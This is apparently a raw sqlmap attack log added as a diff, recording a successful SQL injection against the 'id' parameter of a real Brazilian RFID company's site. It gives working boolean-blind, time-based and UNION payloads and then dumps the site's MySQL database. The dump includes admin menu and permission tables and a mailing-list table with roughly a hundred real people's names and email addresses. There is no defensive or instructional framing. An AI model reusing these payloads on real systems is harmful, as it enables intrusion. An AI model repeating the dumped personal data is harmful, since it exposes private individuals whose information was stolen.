@@ -1,0 +1,419 @@
+sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3899=3899
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-3590 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6b7071,0x4c4b654945506b58536f536e434741515a75674e4358705674446973665a6a646a51417269784446,0x7176707871)-- fHMc
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] sowx
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3899=3899
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-3590 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6b7071,0x4c4b654945506b58536f536e434741515a75674e4358705674446973665a6a646a51417269784446,0x7176707871)-- fHMc
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: sowx
+[14 tables]
++------------------+
+| banners          |
+| cases            |
+| cases_fotos      |
+| grupos_mails     |
+| mails            |
+| parceiros        |
+| produtos         |
+| produtos_fotos   |
+| programa         |
+| programa_usuario |
+| segmentos        |
+| servicos         |
+| servicos_fotos   |
+| usuario          |
++------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3899=3899
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=-3590 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6b7071,0x4c4b654945506b58536f536e434741515a75674e4358705674446973665a6a646a51417269784446,0x7176707871)-- fHMc
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: sowx
+[14 tables]
++------------------+
+| banners          |
+| cases            |
+| cases_fotos      |
+| grupos_mails     |
+| mails            |
+| parceiros        |
+| produtos         |
+| produtos_fotos   |
+| programa         |
+| programa_usuario |
+| segmentos        |
+| servicos         |
+| servicos_fotos   |
+| usuario          |
++------------------+
+
+Database: sowx
+Table: banners
+[12 entries]
++-----------+---------------------------------------------------+----------+------------+-------------+
+| ID_BANNER | TX_LINK                                           | NR_ORDEM | NM_BANNER  | DM_SITUACAO |
++-----------+---------------------------------------------------+----------+------------+-------------+
+| 1         | NULL                                              | 2        | Expedição  | A           |
+| 2         | NULL                                              | 2        | Banner 2   | I           |
+| 3         | NULL                                              | 3        | Banner 3   | I           |
+| 4         | NULL                                              | 4        | Banner 4   | I           |
+| 5         | NULL                                              | 5        | Banner 5   | I           |
+| 6         | NULL                                              | 6        | Banner 6   | I           |
+| 7         | NULL                                              | 7        | Banner 7   | I           |
+| 8         | NULL                                              | 8        | Banner 8   | I           |
+| 9         | NULL                                              | 9        | Banner 9   | I           |
+| 10        | NULL                                              | 10       | Banner 10  | I           |
+| 11        | NULL                                              | 4        | Transporte | A           |
+| 12        | http://www.sowx.com.br/solucoes-detalhe.php?id=18 | 1        | iDriving   | A           |
++-----------+---------------------------------------------------+----------+------------+-------------+
+
+Database: sowx
+Table: cases
+[1 entry]
++---------+----------+---------+---------------------+-------------+
+| ID_CASE | TX_VIDEO | NM_CASE | TX_CASE             | DM_SITUACAO |
++---------+----------+---------+---------------------+-------------+
+| 1       | NULL     | Case 1  | Descrição do Case 1 | A           |
++---------+----------+---------+---------------------+-------------+
+
+Database: sowx
+Table: cases_fotos
+[1 entry]
++---------+--------------+--------------+
+| ID_CASE | ID_CASE_FOTO | DM_PRINCIPAL |
++---------+--------------+--------------+
+| 2       | 1            | S            |
++---------+--------------+--------------+
+
+Database: sowx
+Table: grupos_mails
+[1 entry]
++---------------+-------------+---------------+
+| ID_GRUPO_MAIL | DM_SITUACAO | NM_GRUPO_MAIL |
++---------------+-------------+---------------+
+| 1             | A           | Site          |
++---------------+-------------+---------------+
+
+Database: sowx
+Table: mails
+[102 entries]
++---------+---------------+----------------------------------------------+---------------------------------------+-------------+-------------+
+| ID_MAIL | ID_GRUPO_MAIL | TX_MAIL                                      | NM_PESSOA                             | DT_CADASTRO | DM_SITUACAO |
++---------+---------------+----------------------------------------------+---------------------------------------+-------------+-------------+
+| 1       | 1             | cleveland.soares@gmail.com                   | Cleveland Junior Soares               | 2015-03-27  | A           |
+| 4       | 1             | wagnermattos@hotmail.com                     | wagner                                | 2015-05-29  | A           |
+| 65      | 1             | gabriel.lopes@energisa.com.br                | Gabriel                               | 2015-06-22  | A           |
+| 67      | 1             | industrial@estampaetiquetas.com.br           | Eralcio Luiz Silva                    | 2015-07-10  | A           |
+| 68      | 1             | mnivea85@gmail.com                           | nivea maria de oliveira               | 2015-11-29  | A           |
+| 69      | 1             | 05496682707                                  | Josédavenirgraminhod                  | 2015-12-19  | A           |
+| 70      | 1             | 05496682707                                  | Josédavenirgraminhod                  | 2015-12-19  | A           |
+| 71      | 1             | 05496682707                                  | Josédavenirgraminhod                  | 2015-12-19  | A           |
+| 72      | 1             | 05496682707                                  | Josédavenirgraminhod                  | 2015-12-19  | A           |
+| 73      | 1             | cleveland.soares@gmail.com                   | Cleveland Soares                      | 2016-01-19  | A           |
+| 74      | 1             | mark357177@hotmail.com                       | Mark                                  | 2016-02-10  | A           |
+| 75      | 1             | miltoncardoso@desejosmodaintima.com.br       | Milton cardoso                        | 2016-03-01  | A           |
+| 76      | 1             | miltoncardoso@desejosmodaintima.com.br       | Milton cardoso                        | 2016-03-01  | A           |
+| 77      | 1             | Nael3068@gmail.com                           | Natanael Martins da Silva             | 2016-03-05  | A           |
+| 78      | 1             | valdineic@yahoo.com.br                       | Valdinei C                            | 2016-04-19  | A           |
+| 79      | 1             | neuzaasilva65@gmail.com                      | neuzaasilva65@gmail.com               | 2016-06-07  | A           |
+| 80      | 1             | E-mail                                       | Nome                                  | 2016-06-14  | A           |
+| 81      | 1             | Rosasantos_2013@hotmail.com                  | rosa                                  | 2016-06-18  | A           |
+| 82      | 1             | jackson9@gmail.com                           | Jackson sousa vieira                  | 2016-06-21  | A           |
+| 83      | 1             | E-mail                                       | barbara                               | 2016-06-28  | A           |
+| 84      | 1             | barbarasantossc@gmail.com                    | Bárbara                               | 2016-06-28  | A           |
+| 85      | 1             | pe267648319br                                | Nome                                  | 2016-08-02  | A           |
+| 86      | 1             | E-mail                                       | Nome                                  | 2016-08-02  | A           |
+| 87      | 1             | jimos4581rt@hotmail.com                      | JimmiXS                               | 2016-08-08  | A           |
+| 88      | 1             | duarte.denilson@gmail.com                    | Denilson jose duarte                  | 2016-08-20  | A           |
+| 89      | 1             | alexandre.duarte@3sales.com.br               | Alexandre Duarte                      | 2016-09-04  | A           |
+| 90      | 1             | jurafaccio@gmaiol.com                        | Nome                                  | 2016-09-21  | A           |
+| 91      | 1             | jurafaccio@gmail.com                         | Nome                                  | 2016-09-21  | A           |
+| 92      | 1             | adonayleite@hotmail.com                      | adonay leite                          | 2016-09-24  | A           |
+| 93      | 1             | mdossantos01@lear.com                        | Marcio                                | 2016-10-06  | A           |
+| 94      | 1             | arelysv1964@gmail.com                        | Arelys Vazquez                        | 2016-10-07  | A           |
+| 95      | 1             | E-mail                                       | Marlene                               | 2016-10-14  | A           |
+| 96      | 1             | adonayleite@gmail.com                        | adonay leite                          | 2016-12-26  | A           |
+| 97      | 1             | Claudioamaral.al@gmail.com                   | Claudio amaral                        | 2017-01-09  | A           |
+| 98      | 1             | fidelis.jose.28.27.@gmail.com                | jose edmilson fidelis                 | 2017-01-10  | A           |
+| 99      | 1             | fidelis.jose.28.27.@gmail.com                | jose edmilson fidelis                 | 2017-01-10  | A           |
+| 100     | 1             | edilsonsantospva@hotmail.com                 | EDILSON SANTOS                        | 2017-01-31  | A           |
+| 101     | 1             | daniel_pinheirojr@outlook.com                | Daniel Pinheiro Jr                    | 2017-02-03  | A           |
+| 102     | 1             | E-mail                                       | Gilberto                              | 2017-02-16  | A           |
+| 103     | 1             | daniel_pinheirojr@outlook.com                | Daniel Pinheiro                       | 2017-02-18  | A           |
+| 104     | 1             | antoniofacisa@gmail.com                      | Antonio Alves de Lima Filho           | 2017-02-23  | A           |
+| 105     | 1             | eluziasantos@hotmail.com                     | Eluzia Fernandes Dos Santos           | 2017-02-24  | A           |
+| 106     | 1             | liviapmdf@gmail.com                          | Lívia Bertolini                       | 2017-03-15  | A           |
+| 107     | 1             | Lionsnet1@gmail.com                          | Juarez Leão                           | 2017-03-21  | A           |
+| 108     | 1             | CARLITOMANOEL97@GMAIL.COM                    | CARLITOMANOEL                         | 2017-04-28  | A           |
+| 109     | 1             | 82988852173                                  | CARLITOMANOEL                         | 2017-04-28  | A           |
+| 110     | 1             | erickson@motrisa.com.br                      | erickson                              | 2017-04-28  | A           |
+| 111     | 1             | koreto10@gmail.com                           | Josue Nunes                           | 2017-05-02  | A           |
+| 112     | 1             | E-mail                                       | Nome                                  | 2017-05-04  | A           |
+| 113     | 1             | claudio.silva@sescrio.org.br                 | claudio                               | 2017-06-26  | A           |
+| 114     | 1             | elivitor1982@gmail.com                       | Eliandro vítor de oliveira            | 2017-08-15  | A           |
+| 115     | 1             | danieldri0534@gmail.com                      | Daniel Rodrigues Pereira junior       | 2017-08-23  | A           |
+| 116     | 1             | joana.melo@hotmail.com                       | joana melo                            | 2017-08-23  | A           |
+| 117     | 1             | Rafaah.sales@hotmail.com                     | Rafael Sales                          | 2017-09-03  | A           |
+| 118     | 1             | rodrigofagundes01@gmail.com                  | rodrigo fagundes                      | 2017-09-23  | A           |
+| 119     | 1             | Miheduduh@gmail.com                          | Michele Aparecida Alves De araujo     | 2017-09-27  | A           |
+| 120     | 1             | Df                                           | Nome                                  | 2017-09-28  | A           |
+| 121     | 1             | E-mail                                       | EE                                    | 2017-09-28  | A           |
+| 122     | 1             | roberto.3.carrasco@hotmail.com               | José Roberto Andrades Carrasco        | 2017-09-29  | A           |
+| 123     | 1             | arlasj@hotmail.com                           | João Arlas                            | 2017-10-04  | A           |
+| 124     | 1             | jpinhacosta@gmail.com                        | jorge jeronimo pinha costa            | 2017-10-08  | A           |
+| 125     | 1             | edsonfinite@gmail.com                        | raimundo                              | 2017-10-10  | A           |
+| 126     | 1             | arlasj@hotmail.com                           | João Alfredo Arlas                    | 2017-10-11  | A           |
+| 127     | 1             | luziarezende7654@gmail.com                   | luzia rezende dos santos              | 2017-10-13  | A           |
+| 128     | 1             | 7                                            | Nome                                  | 2017-10-14  | A           |
+| 129     | 1             | luanvalentino2200@com.br                     | Luan valentino de oliveira            | 2017-10-14  | A           |
+| 130     | 1             | Graciellyteixeira17@gmail.com                | Gracielly DOS Santos Teixeira         | 2017-10-15  | A           |
+| 131     | 1             | Graciellyteixeira17@gmail.com                | Gracielly                             | 2017-10-15  | A           |
+| 132     | 1             | E-mail                                       | Nome                                  | 2017-10-15  | A           |
+| 133     | 1             | Graciellyteixeira17@gmail.com                | Nome                                  | 2017-10-15  | A           |
+| 134     | 1             | limamunizm87@gmail.com                       | Maria Eduarda lima muniz              | 2017-10-15  | A           |
+| 135     | 1             | E-mail                                       | Nome                                  | 2017-10-15  | A           |
+| 136     | 1             | g                                            | graziela                              | 2017-10-16  | A           |
+| 137     | 1             | graziela123                                  | Leticia Gabriela                      | 2017-10-16  | A           |
+| 138     | 1             | Me6255652@gmail.com                          | Maria Eugênia Pereira da Silva        | 2017-10-27  | A           |
+| 139     | 1             | nilsoantonio21@hotmail.com                   | Nilson Antonio da Silva               | 2017-11-03  | A           |
+| 140     | 1             | andreamello210@hotmail.com                   | andrea                                | 2017-11-20  | A           |
+| 141     | 1             | itl.2surf@hotmail.com                        | Ítalo Matheus Farias Silva            | 2017-11-21  | A           |
+| 142     | 1             | E-mail                                       | Nome                                  | 2017-11-21  | A           |
+| 143     | 1             | Cleiton bracinho@homail                      | Cleison Alves fernandes               | 2018-01-04  | A           |
+| 144     | 1             | milenapaulo47@gmail.com                      | milena moreira de castro              | 2018-01-07  | A           |
+| 145     | 1             | milenapaulo47@gmail.com                      | milena moreira de castro              | 2018-01-07  | A           |
+| 146     | 1             | marluce.Barauna@Gmail.com                    | Luciana  da Silva  soterio            | 2018-01-09  | A           |
+| 147     | 1             | marluce.Barauna@Gmail.com                    | Luciana  da Silva  soterio            | 2018-01-09  | A           |
+| 148     | 1             | Joiremayaramachado@gmail.com                 | Francisco de Assis santos de Almeida  | 2018-01-09  | A           |
+| 149     | 1             | E-mail                                       | francisca cleidia costa Rocha         | 2018-01-13  | A           |
+| 150     | 1             | eluziasantos@hotmail.com                     | Eluzia                                | 2018-03-28  | A           |
+| 151     | 1             | 3894a1691699a99dd06ac1d5130a66c5@inboxer.net | Nome                                  | 2018-04-24  | A           |
+| 152     | 1             | promarketingservicos@gmail.com               | Juarez Leäo                           | 2018-05-10  | A           |
+| 153     | 1             | peruffo@ipiranga.com.br                      | Daniel Peruffo                        | 2018-05-11  | A           |
+| 154     | 1             | E-mail                                       | Nome                                  | 2018-05-24  | A           |
+| 155     | 1             | E-mail                                       | Nome                                  | 2018-05-24  | A           |
+| 156     | 1             | E-mail                                       | sowx                                  | 2018-07-27  | A           |
+| 157     | 1             | caio.sergio@ccinfra.com                      | Caio Sérgio                           | 2018-11-21  | A           |
+| 158     | 1             | Asa.99990000                                 | Cherllen Sousa                        | 2019-01-03  | A           |
+| 159     | 1             | monawatkinsmiller@mail.postmanllc.net        | Nome                                  | 2019-01-14  | A           |
+| 160     | 1             | elisiario.palermo@gmail.com                  | ELISIARIO PALERMO                     | 2019-01-23  | A           |
+| 161     | 1             | 63992188240                                  | Paulo Henrique                        | 2019-01-24  | A           |
+| 162     | 1             | Bette-2998259@hofennik.org.uk                | Nome                                  | 2019-01-29  | A           |
+| 163     | 1             | Adina-2998260@hofennik.org.uk                | Nome                                  | 2019-01-29  | A           |
+| 164     | 1             | contabilidade@dokapack.com                   | vanessa                               | 2019-02-15  | A           |
+| 165     | 1             | mj4riquelme@gmail.com                        | Maria                                 | 2019-02-25  | A           |
++---------+---------------+----------------------------------------------+---------------------------------------+-------------+-------------+
+
+Database: sowx
+Table: parceiros
+[8 entries]
++-------------+-------------+-------------+
+| ID_PARCEIRO | DM_SITUACAO | NM_PARCEIRO |
++-------------+-------------+-------------+
+| 6           | A           | zebra       |
+| 11          | A           | Impinj      |
+| 12          | I           | IBM         |
+| 14          | A           | IBM         |
+| 15          | A           | xerofy      |
+| 17          | A           | smartrac    |
+| 18          | A           | siemens     |
+| 19          | A           | purelink    |
++-------------+-------------+-------------+
+
+Database: sowx
+Table: produtos
+[2 entries]
++-----------+------------+------------------------+------------+-------------+
+| TX_VIDEO  | ID_PRODUTO | TX_PRODUTO             | NM_PRODUTO | DM_SITUACAO |
++-----------+------------+------------------------+------------+-------------+
+| NULL      | 23         | Descrição do produto 1 | Produto 1  | A           |
+| Produto 2 | 24         | Produto 2              | Produto 2  | A           |
++-----------+------------+------------------------+------------+-------------+
+
+Database: sowx
+Table: produtos_fotos
+[2 entries]
++------------+-----------------+--------------+
+| ID_PRODUTO | ID_PRODUTO_FOTO | DM_PRINCIPAL |
++------------+-----------------+--------------+
+| 24         | 1               | S            |
+| 24         | 2               | N            |
++------------+-----------------+--------------+
+
+Database: sowx
+Table: programa
+[15 entries]
++--------------+---------------------------------------------------------+-----------+-----------------------+-----------------+-----------------+--------------+
+| oid_programa | tx_texto                                                | nm_imagem | nm_arquivo            | nm_programa     | nm_descricao    | nm_estrutura |
++--------------+---------------------------------------------------------+-----------+-----------------------+-----------------+-----------------+--------------+
+| 1            | .Sistema||Sistema|                                      | NULL      | NULL                  | Sistema         | Sistema         | 1            |
+| 2            | ..Usuário|Filtro_Usuario.php|Usuário|                   | NULL      | Filtro_Usuario.php    | Usuário         | Usuário         | 1.01         |
+| 3            | ..Programa|Filtro_Programa.php|Programa|                | NULL      | Filtro_Programa.php   | Programa        | Programa        | 1.02         |
+| 4            | .Cadastros||Cadastros|                                  | NULL      | NULL                  | Cadastros       | Cadastros       | 2            |
+| 5            | ..Banner|Filtro_Banner.php|Banner|                      | NULL      | Filtro_Banner.php     | Banner          | Banner          | 2.01         |
+| 6            | ..Produto|Filtro_Produto.php|Produto|                   | NULL      | Filtro_Produto.php    | Produto         | Produto         | 2.02         |
+| 7            | ..Solução|Filtro_Servico.php|Solução|                   | NULL      | Filtro_Servico.php    | Solução         | Solução         | 2.03         |
+| 8            | ..Case|Filtro_Case.php|Case|                            | NULL      | Filtro_Case.php       | Case            | Case            | 2.04         |
+| 9            | ..Segmento|Filtro_Segmento.php|Segmento|                | NULL      | Filtro_Segmento.php   | Segmento        | Segmento        | 2.05         |
+| 10           | .Mail||Mail|                                            | NULL      | NULL                  | Mail            | Mail            | 3            |
+| 11           | ..Grupo Mail|Filtro_Grupo_Mail.php|Grupo Mail|          | NULL      | Filtro_Grupo_Mail.php | Grupo Mail      | Grupo Mail      | 3.01         |
+| 12           | ..Mail|Filtro_Mail.php|Mail|                            | NULL      | Filtro_Mail.php       | Mail            | Mail            | 3.02         |
+| 13           | .Logoff|../login.php|Logoff|                            | NULL      | ../login.php          | Logoff          | Logoff          | 9            |
+| 16           | ..Exporta E-Mails|Filtro_Gera_Mail.php|Exporta E-Mails| | NULL      | Filtro_Gera_Mail.php  | Exporta E-Mails | Exporta E-Mails | 3.03         |
+| 17           | ..Parceiro|Filtro_Parceiro.php|Parceiro|                | NULL      | Filtro_Parceiro.php   | Parceiro        | Parceiro        | 2.05         |
++--------------+---------------------------------------------------------+-----------+-----------------------+-----------------+-----------------+--------------+
+
+Database: sowx
+Table: programa_usuario
+[34 entries]
++-------------+--------------+------------------+----------------------+----------------+--------------+-----------------+
+| oid_usuario | oid_programa | oid_usuariostamp | oid_programa_usuario | data_stamp     | lg_permissao | nm_usuariostamp |
++-------------+--------------+------------------+----------------------+----------------+--------------+-----------------+
+| 1           | 1            | 1                | 1                    | 20061005115012 | Y            | claudio         |
+| 1           | 2            | 1                | 2                    | 20061005115012 | Y            | claudio         |
+| 1           | 3            | 1                | 3                    | 20061005115012 | Y            | claudio         |
+| 1           | 4            | 1                | 4                    | 20061005115012 | Y            | claudio         |
+| 1           | 5            | 1                | 5                    | 20130912112111 | Y            | claudio         |
+| 1           | 6            | 1                | 6                    | 20061005115012 | Y            | claudio         |
+| 1           | 7            | 1                | 7                    | 20080101122829 | Y            | claudio         |
+| 1           | 8            | 1                | 8                    | 20080108164142 | Y            | claudio         |
+| 1           | 9            | 1                | 9                    | 20090517124650 | Y            | claudio         |
+| 1           | 10           | 1                | 10                   | 20090517124650 | Y            | claudio         |
+| 1           | 11           | 1                | 11                   | 20090517124650 | Y            | claudio         |
+| 1           | 12           | 1                | 12                   | 20090517124650 | Y            | claudio         |
+| 1           | 13           | 1                | 13                   | 20090517124650 | Y            | claudio         |
+| 4           | 1            | 1                | 14                   | NULL           | Y            | claudio         |
+| 4           | 2            | 1                | 15                   | NULL           | Y            | claudio         |
+| 4           | 3            | 1                | 16                   | NULL           | N            | claudio         |
+| 4           | 4            | 1                | 17                   | NULL           | Y            | claudio         |
+| 4           | 5            | 1                | 18                   | NULL           | Y            | claudio         |
+| 4           | 6            | 1                | 19                   | NULL           | Y            | claudio         |
+| 4           | 7            | 1                | 20                   | NULL           | Y            | claudio         |
+| 4           | 8            | 1                | 21                   | NULL           | Y            | claudio         |
+| 4           | 9            | 1                | 22                   | NULL           | Y            | claudio         |
+| 4           | 10           | 1                | 23                   | NULL           | Y            | claudio         |
+| 4           | 11           | 1                | 24                   | NULL           | Y            | claudio         |
+| 4           | 12           | 1                | 25                   | NULL           | Y            | claudio         |
+| 4           | 13           | 1                | 26                   | NULL           | Y            | claudio         |
+| 1           | 14           | 0                | 27                   | NULL           | N            | <blank>         |
+| 4           | 14           | 0                | 28                   | NULL           | N            | <blank>         |
+| 1           | 15           | 0                | 29                   | NULL           | N            | <blank>         |
+| 4           | 15           | 0                | 30                   | NULL           | N            | <blank>         |
+| 1           | 16           | 1                | 31                   | NULL           | Y            | claudio         |
+| 4           | 16           | 1                | 32                   | NULL           | Y            | claudio         |
+| 1           | 17           | 1                | 33                   | NULL           | Y            | claudio         |
+| 4           | 17           | 1                | 34                   | NULL           | Y            | claudio         |
++-------------+--------------+------------------+----------------------+----------------+--------------+-----------------+
+
+Database: sowx
+Table: segmentos
+[8 entries]
++-------------+---------+----------+-------------+--------------------------+-------------+
+| ID_SEGMENTO | DM_LINK | NR_ORDEM | TX_SEGMENTO | NM_SEGMENTO              | DM_SITUACAO |
++-------------+---------+----------+-------------+--------------------------+-------------+
+| 1           | N       | 10       | NULL        | Distribuição e Logística | A           |
+| 2           | N       | 20       | NULL        | Manufatura e Produção    | A           |
+| 3           | N       | 30       | NULL        | Saúde                    | A           |
+| 4           | N       | 40       | NULL        | Varejo                   | A           |
+| 5           | N       | 50       | NULL        | Hotéis                   | A           |
+| 6           | N       | 60       | NULL        | Lavanderia Industrial    | A           |
+| 7           | N       | 70       | NULL        | Moveleiro                | A           |
+| 8           | N       | 80       | NULL        | Curtumes                 | A           |
++-------------+---------+----------+-------------+--------------------------+-------------+
+
+Database: sowx
+Table: servicos
+[10 entries]
++----------+------------+------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
+| TX_VIDEO | ID_SERVICO | NM_SERVICO                                                       | TX_SERVICO                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | DM_SITUACAO |
++----------+------------+------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
+| NULL     | 1          | Controle e Rastreabilidade de Pneus e Frotas                     | Utilize nossa Solução RFID e aumente a vida útil dos pneus de sua frota em até 25% e tenha até 3% de economia de combustível.\r\n\r\nCom a solução SOWX você terá uma gestão com base em fatos e com o mínimo de intervenção humana, alcançando economia significativa em ativos pneus e consumo de combustível.\r\n\r\nCom a utilização de Tecnologia RFID é possível obter de maneira automática e online os seguintes benefícios:\r\n- Cálculo do CPK (Custo por KM Rodado) automático.\r\n- Inventário de pneus e frota online.\r\n- Atingir número máximo de recapagem que um pneu possa oferecer.\r\n- Quais pneus tem que realizar calibragem, alinhamento e balanceamento.\r\n- Saiba quais pneus foram trocados indevidamente.\r\n- Inibição de roubo de pneus.\r\n- Indicadores de Pneus, Frota e Motorista.\r\n- Métricas para obtenção do melhor custo benefício de Pneus e Recapagens.\r\n- Quilometragem percorrida por ciclo de vida do pneu.\r\n- Planejamento de Compra e Recapagem de Pneus.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | A           |
+| NULL     | 2          | Rastreabilidade                                                  | Tenha Rastreabilidade total de seus itens ou produtos. \r\nUtilize RFID e acompanhe em tempo real.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | A           |
+| NULL     | 3          | Controle de Expedição                                            | Com a utilização de portais eletrônicos utilizando Tecnologia RFID é possível saber de fato o que realmente embarcou no veículo.\r\n\r\nCom o Sistema SOWX Integrado com o corporativo e através do conjunto de notas fiscais que devem ser embarcados, o Sistema SOWX orienta os operadores a embarcar somente o que está relacionado com a nota fiscal.\r\n\r\nAs divergências são informadas em um monitor na área de expedição.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | A           |
+| NULL     | 12         | Inventário em Tempo Real                                         | Tenha o seu inventário em tempo real. \r\nUtilize RFID em seus itens e saiba de modo online o que se passa em seus estoques.\r\nSaiba a hora, quem movimentou um determinado item e para onde ele foi.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | A           |
+| NULL     | 13         | Garantia de Autenticidade                                        | Saiba se seu produto é legítimo. \r\nUtilize RFID e não deixe seu lucro nas mãos da pirataria!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | A           |
+| NULL     | 14         | Controle de Itens Retornáveis - RTI (Returnable Transport Items) | Controle de Pallets, Barris, Cilindros, Gaiolas Metálicas, Gaiolas Industriais, Caixas Plásticas e muitos outros itens retornáveis. \r\nCom RFID você saberá onde ele se encontra.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | A           |
+| NULL     | 15         | Controle de Movimentação                                         | Controle de Movimentação de itens e produtos nos processos fabris e logísticos                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | A           |
